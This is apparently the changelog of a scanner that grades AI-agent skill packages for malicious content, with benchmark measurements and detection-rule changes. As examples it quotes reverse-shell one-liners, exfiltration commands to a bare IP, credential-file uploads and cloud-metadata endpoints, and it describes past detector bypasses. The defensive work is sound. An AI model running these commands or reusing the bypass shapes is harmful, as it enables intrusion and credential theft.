# Changelog

## v0.8.0 — 2026-08-27

### Skill root scope — raw and installed layouts now grade identically

**Any directory containing a `SKILL.md` is a skill root, and its whole
subtree is now in scope**, wherever that directory sits — at a repository's
root, nested arbitrarily deep, or under `.claude/skills/`. Before this
change, scope was decided purely by path shape (`SKILL.md`, `CLAUDE.md`,
`.claude/...`), which made a skill directory sitting plainly in a repository
(`raw` layout) a strictly narrower scope than the identical directory
installed under `.claude/skills/` (`installed` layout) — the manifest above
a payload was read either way, the payload itself only when installed.

**Your grade may move.** A repository that graded A may now grade D,
because a payload in `scripts/` beside a `SKILL.md` is now read where
before only the manifest above it was. That is the point of the change,
not a regression.

**Registry checksum unchanged** at `2414c32f04000b5d` (25 rules) — this is
file-class logic, not rule registration. **JSON schema unchanged** at `1.5`
— `model.FileContext` gains `SkillRoot string` (additive, not part of the
wire format: `FileContext` has no JSON tags and isn't reachable from
`ScanResult`).

**Measured (pinned 906-sample MalSkillBench slice, `--fail-on-axis
security=B`):**

| layout | prec, before | prec, after | recall, before | recall, after |
|---|---|---|---|---|
| installed | 0.7018 | 0.7018 (unchanged) | 0.6667 | 0.6667 (unchanged) |
| raw | 0.7330 | 0.7018 | 0.4300 | **0.6667** |

`raw` recall **+23.7 points**, precision **−3.1 points**, F1 **+14.2
points**; `installed` is byte-identical in every measured cell. The two
layouts converge **exactly**: across all 906 samples, 0 differ in security
grade, 0 in any axis grade, 0 in finding set. Of the findings newly visible
on `raw`, 100% already existed in `installed`'s finding set before this
change — the precision cost is `installed`'s existing false-positive rate
becoming visible on `raw`, not new debt. Of the security-axis findings that
newly cross the gate on 38 previously-clean benign samples, 37 are noise (a
rule misreading benign documented behaviour) and 1 (`clauditor`) is a
genuine, defensible catch of real masquerading/persistence techniques.
Full detail: ADR-0010 and
`<workspace>/docs/product/research/bench-2026-08-24/metrics-skillroot.txt`.

**Stored scans are not silently re-graded.** Existing gallery entries and
stored scan results were measured by an older engine and stay as they are,
labelled with the engine version that produced them. Re-scanning happens on
the normal refresh path, not as a migration, so nobody's badge changes
without a scan they can point at. `skilltrust` owns surfacing the engine
version beside a stored grade; that work is tracked there, not here.

`node_modules`, `vendor`, `dist`, `build`, `target`, `.next`, `.git` stay
excluded — the hardcoded skip-dir list sits above the new skill-root logic,
so a `SKILL.md` inside any of them creates no scope root. User-level
installs (`~/.claude/`) remain out of scope — separate work.

### SD-025 Reverse Shell (new rule)

Added **SD-025 Reverse Shell** — Critical, security axis, category `"Reverse
Shell"`. The first rule in the engine to detect a socket bound to a shell.

**Registry checksum MOVED** `589619b6386d2c41` → **`2414c32f04000b5d`**
(24 → 25 rules). This is the first checksum move since v0.6.0. A consumer keyed
on the checksum (e.g. `skilltrust`'s triage cache, ADR-0007) invalidates — that
is correct, the ruleset genuinely changed. On release, all three downstream pins
move: `scan-action/action.yml`, `skilltrust/go.mod`, skilltrust's CI fixture
clone (`make versions` is the gate; runbook: `release.md#downstream-propagation`).

**JSON schema unchanged** at `1.5` — SD-025 adds no wire field.

`expectedChecksum` is not pinned (ADR-0003); the value above is recorded here as
the fingerprint, not a gate.

**What it detects.** The carrier is *a socket and a shell in the same program*
(ADR-0009), not a list of literal one-liner forms. Two paths: a single line that
is already socket+shell (`nc -e`, an interactive shell redirected onto
`/dev/tcp|udp`, a `mkfifo`/`openssl s_client` relay), or a low-level socket
library call and a shell-exec primitive both present in one file — the multi-line
python/perl/php/node/powershell payloads that are MalSkillBench behaviour B6.
Previously all of `bash -i >& /dev/tcp/…`, the python `socket`+`dup2`+`pty.spawn`
one-liner, and the `mkfifo`+`openssl` relay graded A; only `nc -e` fired, and only
incidentally via SD-007.

**Measured (pinned 906-sample MalSkillBench slice, `--fail-on-axis security=B`).**
Benign false positives do **not** rise on either layout; a few malicious samples
newly cross the gate (most reverse-shell malware was already flagged worse-than-B
by SD-007/SD-009):

| layout | mal flagged | benign flagged | precision | recall |
|---|---|---|---|---|
| installed, before | 197 / 300 | 85 / 300 | 0.699 | 0.657 |
| installed, SD-025 | **200 / 300** | 85 / 300 | 0.702 | **0.667** |
| raw, before | 127 / 300 | 47 / 300 | 0.730 | 0.423 |
| raw, SD-025 | **129 / 300** | 47 / 300 | 0.733 | **0.430** |

B6 reverse-shell recall (Set B, threshold C) rose: CI 0.60→0.90, PI 0.70→1.00
installed. On the full 7944-sample pool, SD-025 is the **sole** reason security crosses the gate (worse than B) for **78 malicious samples on the installed layout and 33 on raw — with zero new benign crossings on either** (the 4 benign files it fires on were already flagged by another security rule). The 906-slice delta above is smaller only because Set A's malware is sparse in reverse shells. Predicate separation on the full 7944-sample pool: malware 6.31% vs
benign 0.10%, lift 63 — the benign hits are security/sysadmin reference docs that
quote revshell payloads verbatim. Full write-up:
`<workspace>/docs/product/research/bench-2026-08-24/metrics-sd025.txt`.

**Grading changes; builds that passed can fail.** A repository shipping a reverse
shell in an installed skill now grades security F where it graded A. If a build
starts failing on this change, the finding is real — read it before pinning back.

Also surfaced while building the negative fixtures: `nc -zv host port` port scans
grade security D via a pre-existing SD-007 behaviour (bare `nc` matches its
network-command regex; SD-007 only demotes when a URL is present). Unrelated to
SD-025, logged for the SD-007 false-positive backlog.


## v0.7.0 — 2026-08-26

The first release since `v0.6.0` (2026-08-14) and a large one: eleven commits
carrying a measurement-driven precision programme, a scope fix, an
empty-scan-honesty fix, and a rework of `networkCallRule`'s demotion policy.
Read the two warnings below before upgrading.

**Registry checksum unchanged** at `589619b6386d2c41`. Every rule change in
this release is match-time logic — no rule's registered `(ID, Name, Severity,
Category, Axis)` moved — so a consumer keyed on the checksum (for example
`skilltrust`'s triage cache, ADR-0007) does not invalidate.

**JSON schema `1.4` → `1.5`**, additively: `ScanResult` gains
`no_agent_surface`. See the second warning.

### ⚠️ This release changes grades. Builds that passed on v0.6.0 can fail.

No new rule was added and the checksum did not move, but detection genuinely
improved and a CI gate is a threshold over grades. Measured on a pinned
906-sample MalSkillBench slice at `--fail-on-axis security=B` (security axis
alone, strictly worse than B):

| layout | malicious flagged | benign flagged | precision | recall |
|---|---|---|---|---|
| installed, v0.6.0 lineage | 187 / 300 | 82 / 300 | 0.695 | 0.623 |
| installed, this release | **197 / 300** | 85 / 300 | 0.699 | **0.657** |
| raw, v0.6.0 lineage | 113 / 300 | 41 / 300 | 0.734 | 0.377 |
| raw, this release | **127 / 300** | 47 / 300 | 0.730 | **0.423** |

Ten more malicious samples are caught per 300 on the installed layout, and
fourteen more on the raw layout. Three benign samples per 300 newly fail on
each. If a repository's build starts failing on this upgrade, the finding is
probably real — read it before pinning back.

### ⚠️ A scan that checked nothing no longer reports a grade

Previously, a repository with no `SKILL.md`, no `CLAUDE.md`, no `.claude/` and
no `.agents/` was graded **A across the board**, because no rule fired and no
rule can fire on a file no rule reads. That is a false assurance, and it is now
a distinct state: `ScanResult.NoAgentSurface` is `true`, `Axes` is empty, and
the text verdict reads `∅ Nothing checked` instead of `✓ No concerns`.

**Consumers must not store or display this as a passing result.** A consumer
that reads "no axis grades" as "no problems" reproduces the bug one layer up,
in whatever it renders. The exit code is unchanged (`0`, since there are no
findings) — branch on the field, not on the code.

### Fixed (SD-007 demotion policy, 2026-08-26)

- **A statement is demoted only when it is nothing but its call.**
  `networkCallRule` suppressed a security finding by asking whether the
  statement did any of a *list of dangerous things*. A deny-list has to
  enumerate every dangerous thing a statement can do, fails open on
  everything it forgot, and ships in a public repo where an attacker reads
  it. It forgot reverse shells entirely: in a `SKILL.md` fenced block,
  `echo "https://example.com" && nc -e /bin/sh 10.0.0.1 4444` graded
  **security A** on a Medium/`transparency` note, while the identical line
  in a `run.sh` graded **D** — the whole difference was `isDocFile`. Two
  more holes on the same rule: `suspiciousEndpoint` was applied to the
  *first* URL of a statement only, so
  `curl https://api.example.com/v1 && curl -X POST http://185.220.101.5/collect`
  graded A and the reverse order graded D; and a call on a backslash
  continuation inside a doc file was never scanned at all, because the call
  regexes read the first line while the demotion judged the joined
  statement. None of the three ever shipped — v0.6.0 predates the release
  that introduced them.

  The replacement is an allow-list of **form**: demote only when the
  statement is one call, its flags and its target — no `&&`, `;` or pipe,
  and no `$(` unless it is the statement's own capture assignment
  (`DATA=$(curl …)`). It fails **closed**: anything the predicate does not
  recognise keeps its registered High/`security`. Applied at every demotion
  site, so a guard cannot be added to one and missed at another.

  Each veto element was measured separately on the currently-demoted
  population before being included or dropped. Included: chain `&&`/`;`
  (12 malicious findings against 5 benign), pipe (84 / 26), and `$(`
  everywhere except the capture-assignment head (18 / 17 overall, and the
  benign ones are that head). Dropped as measurably wrong-way: a backtick
  (10 / 5, and the benign side is markdown inline code, not substitution),
  a background `&` (1 / 11), a redirection (2 / 25). A carve-out for a pipe
  into a pure formatter (`curl … | jq .`) was measured and **not** shipped —
  the lines it spares are 31 malicious against 6 benign.

- **A bare routable IP literal in prose is no longer silent.** The third
  demotion site is the doc-file branch of the bare-URL fallback, and it
  needed its own measurement rather than the same predicate: escalating on
  `suspiciousEndpoint` in full fires on 37 benign and 28 malicious such
  lines in the corpus — `http://localhost:8080/` as an OAuth redirect URI,
  over and over. Narrowed to a *globally routable* IP literal the same
  population is 4 malicious findings across 3 samples and **zero** benign.

  Measured, 906-sample slice, `--fail-on-axis security=B` (security axis
  alone, strictly worse than B):

  | layout | benign flagged | malicious flagged | precision | recall | F1 |
  |---|---|---|---|---|---|
  | installed, before | 80 / 300 | 187 / 300 | 0.7004 | 0.6233 | 0.6596 |
  | installed, after | 85 / 300 | **197 / 300** | 0.6986 | **0.6567** | **0.6770** |
  | raw, before | 41 / 300 | 113 / 300 | 0.7338 | 0.3767 | 0.4978 |
  | raw, after | 47 / 300 | **127 / 300** | 0.7299 | **0.4233** | **0.5359** |

  B1–B9 behaviour recall 0.9370 → 0.9481 installed, 0.6889 → 0.7481 raw.
  Registry checksum unmoved at `589619b6386d2c41` — all match-time logic.

- **An adversarial fixture corpus, committed and asserted**
  (`cmd/skill-detector/testdata/adversarial/`). None of the shapes above
  exists in the 906-sample corpus, so a bench re-run is byte-identical
  whether they pass or fail. Corpus measurement prices what a suppression
  *costs*; only constructed cases price what it costs to leave one open.
  Cases are whole skill packages and the test asserts a **minimum grade on a
  named axis** — what regressed was the grade a user sees, and a rule-level
  assertion passes happily while a finding is demoted onto an axis nobody
  gates on. Four control cases assert the cost side stays demoted.

  A second table records three shapes **no rule detects**: `bash -i >&
  /dev/tcp/…`, an inline python `socket`+`pty` payload, and the perl
  `Socket`+`exec` one-liner. SD-007 only ever saw them because a URL
  happened to share the line. That test asserts they are undetected and
  fails when that changes. The engine has no reverse-shell rule; adding one
  registers a new ID and moves the ruleset checksum, so it is a release
  step, not a bugfix.

### Changed (engine precision programme, 2026-08-26)

Measurement-driven follow-on to the SD-007/SD-008 work below: one rule
change per class actually measured to separate malicious from benign, one
class per entry left alone with the lift table that says why. Registry
checksum unmoved at `589619b6386d2c41` throughout — every change here is
match-time logic, not a registered `(ID, Name, Severity, Category, Axis)`
field. Method, per-task reports, and the full-pool re-measurement:
`docs/product/research/methodology-audit-and-validation-2026-08-24.md`
Part 5f (workspace repo).

Headline, 906-sample slice (Set A = 300 benign / 300 malicious),
`--fail-on-axis security=B`, installed layout — the gate metric here is the
**security axis alone**, which is what that flag tests:

| | benign flagged | malicious flagged | precision | recall |
|---|---|---|---|---|
| before (`3d37140`) | 82 / 300 | 187 / 300 | 0.695 | 0.623 |
| after | 80 / 300 | 187 / 300 | 0.700 | 0.623 |

Nothing on the malicious side moves: B1–B9 recall 0.94 and B10–B15 recall
0.12 are unchanged to four decimal places, and the malicious finding count
is identical. Reproduction bundle and the run this table comes from:
`docs/product/research/bench-2026-08-24/` (`results-s1-trim.tsv`,
`metrics-s1-trim.txt`).

- **SD-002: a ZWJ directly between two emoji codepoints is not a hidden
  payload** (`d3c2c92`). `isInvisibleRune` correctly treats U+200D ZERO
  WIDTH JOINER as payload-carrying in general, but 9 of the 10 benign
  SD-002 findings in the validation corpus were ordinary compound emoji —
  🧙‍♂️, 👨‍🍳, 👨‍🏫, 🧑‍🚀 — that Unicode renders as one glyph using exactly that
  codepoint. New carve-out: an invisible rune is exempted from the count
  when it is a ZWJ with a pictograph on **both** sides — a codepoint in one
  of five named pictograph blocks (`U+1F300–U+1F5FF`, `U+1F600–U+1F64F`,
  `U+1F680–U+1F6FF`, `U+1F900–U+1F9FF`, `U+1FA70–U+1FAFF`), or one of an
  explicit 10-codepoint set of symbol-block modifiers that Unicode's RGI
  role/profession sequences actually pair with (`U+2640`, `U+2642`,
  `U+2695`, `U+2696`, `U+26A7`, `U+2602`, `U+2620`, `U+26D1`, `U+2708`,
  `U+2764`). Two wider first versions were cut in review: the whole
  `U+2600–U+27BF` block, which also holds ordinary prose furniture (check
  marks, scissors, arrows), and the single span `U+1F300–U+1FAFF`, which
  swallows the Ornamental Dingbats, Alchemical, Geometric-Shapes-Extended,
  Supplemental-Arrows-C and Chess blocks — a ZWJ between two chess pieces
  was exempt (`1d170ad`). The exemption is applied per rune, not only to a
  line carrying a single invisible rune, and at most `maxExemptZWJPerLine`
  = 4 per line qualify; past that none are exempted and the whole line
  counts as before, which is what closes the covert channel of encoding one
  bit per adjacent emoji pair. A ZWSP/ZWNJ (not ZWJ), and any invisible
  rune without a pictograph on both sides, fire exactly as before — those
  separate cleanly (65.5%/58.6% malicious vs 0% benign in the corpus).
  Measured a hard gate before shipping: the carve-out fires on **zero**
  malicious SD-002 findings in the corpus, not merely a favorable ratio.
  906-sample slice, installed layout: benign flagged at `security=B`
  82 → 80 (both un-flagged samples are SD-002's: `cursor-council`,
  `personas`), benign security-axis grade F 20 → 18, SD-002 findings on
  benign 10 → 1, malicious side and B1–B9 recall completely unmoved. A
  candidate predicate for the plan's originally-targeted class
  (documentary/prose injection) was also measured and found to be a
  provable no-op — zero hits on both populations across the whole
  corpus — and closed with no engine change; see Part 5f.
- **SD-004: `.credentials` no longer matches inside an unrelated dotted
  identifier chain** (`13a2505`). `credentialPaths`' `.credentials` entry
  was a bare `bytes.Contains` substring test with no word boundary, so it
  fired on `from google.oauth2.credentials import Credentials`, on a
  markdown field-doc bullet (`broker.credentials.apiKey: ...`), and on an
  SSH **public** key path (`~/.ssh/id_ed25519.pub` — the `.pub` suffix
  marks it non-secret). Three narrow, measured exemptions ship — Python
  import statements, markdown field-doc bullets naming a credential field
  without accessing it, and `.pub`-suffixed SSH paths — an ambiguous
  identifier-chain access (`args.credentials`) and a genuinely documentary
  line inside a skill whose stated purpose is vetting other skills both
  stay flagged, on purpose. All three candidate predicates the plan
  proposed measured **zero of 11** benign hits before this — none matched
  the real shape; reading the 11 lines directly is what found the actual
  bug. 906-sample slice, installed layout: SD-004 findings on benign
  11 → 2 (−82%), zero malicious-side cost. SD-004 grades
  `permission_hygiene`, so none of this moves the `security=B` gate.
- **Every one of those three exemptions is vetoed on a line that acts**
  (`53c0f78`, `279aa69`, `1d170ad` for the SD-002 sibling). Each exemption
  recognises a *shape*, and a shape ships in a public repo where an
  attacker reads it. So: a doc-bullet or public-key line that also runs a
  command loses its exemption (the veto list is `reShellInvocation` plus a
  reader-verb set — `head`/`tail`/`less`/`awk`/`sed`/`grep`/`xxd`/
  `strings`/`od`/`open`/`pbcopy`/`env`/`printenv`); an import clause with
  anything appended after it no longer matches; and a `.pub` line naming a
  second, private key does not read as all-public, including when that
  second path is spelled `$HOME/.ssh/` or `${HOME}/.ssh/` and no command
  appears on the line at all. The variable spellings are deliberately
  **not** added to `credentialPaths` — recognising a token so the
  exemption stops applying is a different question from detecting it, and
  the detection widening is its own separately measured change. Every hole
  is pinned by a regression test naming the bypass it closes.
- **The SD-004 widening is kept out of the regex SD-013 shares**
  (`e42b9da`). The reader verbs above live in their own regex with exactly
  one caller, because `reShellInvocation` is also SD-013's documentary
  veto: a reader verb reaching it re-flags ordinary threat-model questions
  ("Could it grep .zshrc to check settings?") as CRITICAL persistence.
  `TestReaderVerbsAreNotInSharedShellInvocationRegex` fails the moment
  someone merges the two lists.
- **SD-007's printed-URL demotion — implemented, measured, and dropped.**
  A `print(url)` / `console.log(url)` / `echo $url` statement discloses a
  target rather than reaching one, and demoting it to
  Medium/`transparency` measured well as a predicate (inverse lift 18.4).
  It is not in this release: the benefit was **2 benign samples out of
  300**, and review found four constructible bypasses inside it — a
  printed URL sharing a line with a reverse shell (`bash -i >&
  /dev/tcp/...`, a `python3`/`perl` socket-exec one-liner, or an
  `Invoke-WebRequest` download) rode along on the demotion and took the
  sample from D to A. The three demotion sites in `networkCallRule` are
  being reworked together as one policy — demote only when the statement
  is nothing but the call and its URL — instead of extending a deny-list
  of dangerous verbs that an attacker can read.
- **SD-003 `/tmp`/`/var/folders` workspace-path exemption — measured and
  rejected, no engine change.** The proposed exemption would carve out
  paths malware uses at a *higher* rate than benign skills do: on the
  absolute-path branch specifically, malicious 53.7% vs benign 49.4%
  (real cryptominer/SUID-bash payloads staged in `/tmp`, against ordinary
  benign report-writing at the same path prefix). SD-003's 242 benign
  findings (`permission_hygiene` axis, not read by `--fail-on-axis
  security=B`) are unchanged; this is a measured no-op, not a deferral.
- **SD-007 class 1 (a skill calling its own API from its own script) and
  SD-009's installer-domain allowlist — both measured and rejected, no
  engine change.** SD-007: `host also named in SKILL.md` fires on 51.8% of
  malicious and 47.1% of benign findings (inverse lift 0.91, re-verified at
  0.916 on the non-tautological subset) — no separation. SD-009: the
  plan's guessed domain list matches zero real benign findings; the actual
  benign domains (`cli.inference.sh`, `foundry.paradigm.xyz`) also cover 2
  of 6 malicious findings hiding behind the same vendor domain, and even
  where the predicate is unambiguous, demoting Critical→Medium only moves
  the affected benign samples from security F to C — still failing
  `--fail-on-axis security=B` — so it wouldn't have changed the gate
  outcome regardless.
- **Grade scale reachability — documented, no code change.** The stale
  worklist item ("B is unreachable, map something to Low or say A/C/D/F")
  was already false: the SD-007 declared-endpoint demotion (below) puts a
  Medium finding on `transparency`, which the cap table maps to B. The
  scale actually produced: A/C/D/F on security and permission_hygiene, A/B
  on transparency (C/D unreachable there by construction — no rule ever
  emits High/Critical on transparency), A-only on quality (no rule assigns
  that axis). No rule anywhere emits Low or Info severity. Registry
  checksum unmoved — this is a documentation correction, not a cap-table
  edit.

### Changed
- **SD-007 tells a declared endpoint from a call.** In a documentation or
  data file a URL is a disclosure — a Notion skill's manifest naming
  `https://api.notion.com/v1/pages` is saying what it talks to, not doing
  something wrong — and it now grades **Medium on `transparency`** instead of
  **High on `security`**. It stays High/security when the statement sends
  local state (`curl -d "$(env)"`), when the host is one a published API would
  not use (bare IP, non-standard port, ephemeral tunnel or request-bin), when
  the target is not visible, and always inside executable code. The URL is now
  read from the whole shell statement, so a target on a backslash continuation
  is seen. Registered severity stays High/security — that is the ceiling and
  what `registry.Checksum()` hashes, so the checksum is unmoved.
- **SD-007 no longer matches the English verb "fetch".** `\bfetch\s+` fired on
  "a script to fetch live data" and "not visible to fetch". The JS `fetch(...)`
  call and shell `fetch https://...` still fire.

  Measured on a 600-sample MalSkillBench slice (300 malicious / 300 benign),
  `--fail-on-axis security=B`, skills scanned as installed:

  | | precision | recall | FP-rate | benign flagged |
  |---|---|---|---|---|
  | before | 0.644 | 0.707 | 0.390 | 117 / 300 |
  | after | 0.678 | 0.647 | 0.307 | 92 / 300 |

  (Superseded by the combined figures below once the review fixes landed.)

  Recall on code-level behaviours (B1–B9) moves 0.97 → 0.94. Of the 11
  malicious samples that stop being flagged, all 11 were held up by SD-007
  alone and 9 of those by the prose verb; the two real ones are
  privilege-escalation *instructions* in a manifest, which SD-002 should catch
  deliberately rather than SD-007 catching by accident.
- **A truncated statement no longer hides the line after it.** `shellStatement`
  stops joining at 8 lines; it reported having consumed one line more than it
  wrote, so the caller skipped a line nothing had scanned. Eight
  backslash-continued lines were enough to hide a `curl` from SD-007 entirely.
  A detection bypass introduced by the de-duplication fix below, found in
  review before either shipped.
- **`curl -T` / `--upload-file` / `wget --post-file` count as sending local
  state, judged by the argument rather than by the command.** These flags take
  a bare path, so they cannot match the `@file` shape. Deciding whether one
  belongs to curl (GNU wget's `-T` is `--timeout`) took three attempts that
  were each wrong about shell syntax in a new way — a newline inside a joined
  statement, an `&` inside a quoted query string, the word "curl" in a trailing
  comment. The rule no longer asks: the argument is a file (`~/…`, `/…`,
  `./…`) or a timeout (digits), and testing that needs no idea where a command
  begins — including when the path is written through a variable, where the
  slash after it is what separates `$HOME/.aws/credentials` from `$TIMEOUT`.
  `curl -T data.json` — a bare relative filename — no longer counts, which is
  the one shape given up for removing the whole class. `-d @data.json` still
  does: the `@` marks the argument as a file to read, so nothing is ambiguous
  there.
- **A bracketed IPv6 host survives URL extraction.** `reHTTPURL`'s character
  class excludes `]`, so `http://[fd00:ec2::254]/latest/meta-data/` — the AWS
  metadata service over IPv6 — was cut at the bracket, and the address never
  reached the host test that would have kept it on the security axis. The IPv4
  form of the same endpoint was always caught. Harmless while every match took
  the registered severity; it decides the axis now.
- **Internal-only and packed hosts count as suspicious.**
  `metadata.google.internal`, a bare `metadata`, anything under the `.internal`
  private TLD, and the numeric spellings of an IPv4 address that
  `net.ParseIP` rejects (`2130706433`, `0x7f000001`). A published API does not
  live at any of them, which is the criterion the bare-IP and port tests
  already apply — these are the hosts that carry a name or an unusual base.
- **`-d @-` is stdin, not a file**, so a heredoc body is no longer read as an
  upload. A quote between the `@` and the path (`-d @"/etc/passwd"`) is
  stripped, since the shell strips it identically to `-d "@/etc/passwd"`.
- **A short option's value may be attached.** curl parses `-d@FILE` exactly as
  `-d @FILE` (verified against curl 8.7.1: both fail with "error encountered
  when reading a file", where a literal body reaches the connection attempt).
  Requiring a separator made the whole check a one-character evasion.
- **The body-flag list is complete**: `--data-ascii` was missing, and wget's
  `--post-file=` — its equivalent of `curl -T` — is now covered too.
- **An `@` inside a literal request body is no longer read as a file upload.**
  `-d '{"email":"user@example.com"}'` matched the upload idiom and kept the
  finding at High. The `@` now has to open the argument or a `field=` value.
- **A statement's continuation lines are no longer re-judged as statements.**
  SD-007 read the URL from the backslash-joined statement but did not skip the
  lines it consumed, so a wrapped command produced one finding per line —
  three for a single call. Found in review of this PR; it removed 25 duplicate
  findings from the 600-sample slice (SD-007 benign 901 → 881, malicious
  1359 → 1354), which was small enough that the headline figures held.
- **`curl -d @file` counts as sending local state again.** `exfiltratesLocalData`
  returned early unless it saw `$(`, so the `@`-prefixed upload idiom —
  `-d @path`, `--data-binary @path`, `-F field=@path`, the form the repo's own
  canonical SD-007 fixture uses — was demoted to transparency in documentation.
  Found in review of this PR.
- **SD-008 no longer treats every long alphanumeric run as a payload.** `/` is
  in the base64 alphabet, so a deep path matched; so did a hex wallet address
  and any single-case identifier. Worst of all, npm lockfile `"integrity"`
  values matched — 322 findings on benign skills against **zero** on malicious
  ones. The inline branch now requires the token to look encoded (mixed case
  plus a digit or `+`/`/`, and not a path shape) and damps subresource-integrity
  and hex-literal lines. The decode-call branches (`base64 -d`, `atob`,
  `b64decode`) are untouched — that is where the signal was all along
  (22.6% of malicious hits vs 2.0% of benign).

  SD-008 findings across the same 600 samples: **benign 410 → 31**, malicious
  221 → 136. The exemption for path-shaped tokens is a case-stability test, not
  a slash test: `/` is in the base64 alphabet, and across 20000 encodings of 30
  random bytes **24.8%** contain a `/` with no `+` and no padding, so a slash
  test discarded a quarter of all genuine payloads. A path is several word-like
  segments — `claude/skills/CORE/USER/Art` flips case on 2% of its character
  boundaries where random base64 flips on 33%. The shipped test catches 74.5%
  of the corpus path tokens and discards **0 of 20000** genuine payloads. Found
  in review of this PR. Findings on benign skills overall 1724 → 1271; the worst single
  benign skill went from 244 findings to 109.


### Changed
- **An empty scan no longer grades A.** Discovery is deliberately wider than
  the rules' path gates, so "N files scanned" never meant the agent surface was
  read. When no discovered file is agent surface, the scan now sets
  `no_agent_surface`, emits **no** axes and **no** permissions, warns, and its
  text verdict reads `∅ Nothing checked — no agent configuration files in
  scope` instead of `✓ No concerns`. Previously such a scan reported four A
  grades and a clean verdict, and that A travelled into CI exit codes, badges
  and downstream databases. `--fail-on-axis` already treats a missing axis as
  "nothing to compare", so exit codes are unchanged for graded scans.
- **Schema `1.4` → `1.5`** — additive: `no_agent_surface` (bool, omitempty).
  Registry checksum unmoved (no rule metadata or cap-table change).

- **Text output hides the `quality` axis while nothing drives it.** The axis
  is a reserved slot with zero rules mapped, so the unconditional
  `Quality A` row read as "quality was checked and it's excellent" when
  nothing was checked. The row is skipped when the axis has no driving
  findings and reappears by itself the day a rule lands on the axis.
  **JSON is unchanged** — all four axes stay in the wire format (ADR-0001),
  and `--fail-on-axis quality=...` still works. Registry checksum unmoved.

### Fixed
- **`.agents/` is now in scope.** `isInAgentConfigDir` / `inAgentDir` /
  `walkableHiddenDirs` listed every harness dot-dir except `.agents/` — the
  path `npx skills add` installs into, and the convention third-party skill
  registries publish for. A skill installed the standard way was invisible:
  the same fixture graded **F** under `.claude/skills/` and **A** under
  `.agents/skills/` with "0 files scanned". Script extensions
  (`.ts`, `.py`, ...) inside the tree are scanned there like in any other
  agent config dir, which is what catches payloads bundled in `*.test.ts` /
  `conftest.py` that the developer's own test runner executes.

## v0.6.0 — 2026-08-14

Engine-review wave (F-02, F-03, F-05, F-06, F-08, F-09, F-10 of
`docs/engine-review-findings-2026-08-14.md`). Registry checksum unchanged
(`589619b6386d2c41`); JSON schema version unchanged (`1.4` — no shape change).

### Fixed
- **`delta` no longer reports churn on line shifts** (F-02). Inserting a line
  above a finding shifted its line number, which was part of the match key, so
  every finding below the edit came back as a `resolved` + `new` pair — enough
  to fail a `skilltrust` PR check on a whitespace-only change. Leftovers from
  the exact match are now paired one-for-one on the same key minus the line
  number, and only the residue is reported. `findingKey` and the finding
  payload are unchanged; ruleset checksum unmoved. ADR-0007.
- **`delta` output is deterministic.** `new_findings` / `resolved_findings` were
  built by ranging over maps, so their order — and which finding got quoted in
  `axis_explanations` — varied between runs on identical input. Both lists now
  follow scan order.
- **Triage verdicts are no longer mis-applied on key collisions** (F-03).
  Verdicts were matched back to findings by `{RuleID, Line}` alone; rules that
  emit several findings with the same key (SD-021: one per MCP server, all on
  line 1; SD-002: several signals per line) got last-write-wins, so a
  `benign_example` verdict for one finding could suppress a `real_threat`
  sibling from axis grading. `triage.Verdict` gains an optional 1-based
  `Index` naming the finding it applies to (additive API); a key claimed by
  two findings or two verdicts now falls to the `unavailable` fail-safe
  instead of being guessed. Shipped verifiers stamp `Index`.
- **Capability inference no longer goes stale silently** (F-08). Findings from
  SD-005, SD-006, SD-016, SD-017, SD-019, SD-020, SD-021, SD-022, SD-023 and
  SD-024 now contribute to the reported `permissions`; previously only nine
  rule IDs did, so a skill flagged solely by SD-022 (DNS exfiltration) reported
  no `network` capability at all. The hardcoded switch is now a table
  (`ruleCapabilities` / `capabilityFreeRules`) and a new test fails whenever a
  registered rule is in neither, so new rules cannot skip classification.

### Added
- Schema-version enforcement (F-10). `model.SchemaVersion` is now a named
  constant, `cmd/skill-detector/testdata/schema_output.golden` holds real
  `scan --format json` output, and `schema_shapes.json` pins each version to a
  fingerprint of the emitted shape — changing the output without bumping the
  version now fails the build. Bump procedure documented in
  `docs/development-guide.md`.
- README documents the warn-without-failing CI recipe for exit code `1`
  (F-05): a `|| [ $? -eq 1 ]` one-liner and an explicit `case` form emitting
  `::warning::`, plus a caution that `|| true` swallows exit `3`.

### Removed
- `rules.RegisterMCPRulesStrict` — dead since v0.2.0, when `--strict-mcp` moved
  to a post-hoc severity upgrade (`applyStrictMCP`) to keep the checksum stable.
  No caller existed in this repo or downstream. Exported-API removal, but only
  in name: calling it produced a registry the CLI never used (F-06).
- `cmd/skill-detector::newRegistry` — a hand-maintained duplicate of
  `rules.DefaultRegistry()`, plus the parity test that existed only to catch
  drift between the two. Rule groups are registered in one place again (F-06).

## v0.5.0 — 2026-08-05

### Added
- **`SD-024` — MCP Auto-Installed Package Execution** (MEDIUM, transparency
  axis — the first rule on that axis). Flags MCP server entries whose
  `command` is a package auto-fetcher (`npx`, `uvx`, `pipx`, `bunx`): the
  server pulls and runs a registry package at startup rather than a pinned,
  audited binary.
- **Multi-harness coverage.** The harness-agnostic content rules (SD-002,
  SD-003, SD-004, SD-015, SD-016, and friends) now also run over Codex
  CLI/OpenCode (`AGENTS.md`), Gemini CLI (`GEMINI.md`), Cursor
  (`.cursorrules`, `.cursor/rules/*.mdc`), Windsurf (`.windsurfrules`), and
  GitHub Copilot (`.github/copilot-instructions.md`) instruction files.
  `.cursor/mcp.json` and `.vscode/mcp.json` (including VS Code's `servers`
  key) are now classified as MCP configs. Discovery also follows in-tree
  symlinks (e.g. `CLAUDE.md -> AGENTS.md`), previously skipped as
  non-regular files.
- Agent-config-dir script discovery: extensionless and `.zsh` files inside
  `.claude/`, `.codex/`, `.opencode/`, etc. are now walked, closing a blind
  spot where hook scripts without a recognized extension were invisible to
  every content rule.
- **Gitignore-blindness warning.** When `.gitignore` causes an agent config
  path (`.claude/settings.json`, `SKILL.md`, etc.) to be skipped, the scan
  now emits a warning in `ScanResult.Warnings` naming the count and
  suggesting `--scan-all`. Schema version bumped to **1.4**
  (`ScanResult.SchemaVersion`) for the new field.
- `--fail-on-axis` now rejects a misspelled/unknown axis name instead of
  silently treating it as a no-op.

### Changed
- **Nested hooks schema.** SD-019/SD-020 now parse the real Claude Code
  hooks shape (`{"hooks":{"PreToolUse":[{"matcher":"...","hooks":[{"command":"..."}]}]}}`)
  in addition to the old flat shape; hook commands nested under a matcher
  were previously invisible to both rules.
- **Permission-string syntax coverage.** `Bash(curl:*)` (colon-prefix
  wildcard) and `Bash(curl*)` (no-space wildcard, strictly broader than
  `Bash(curl *)`) are now recognized, as is the PowerShell tool shape
  alongside Bash. SD-017/SD-018/SD-023 all share the widened parser.
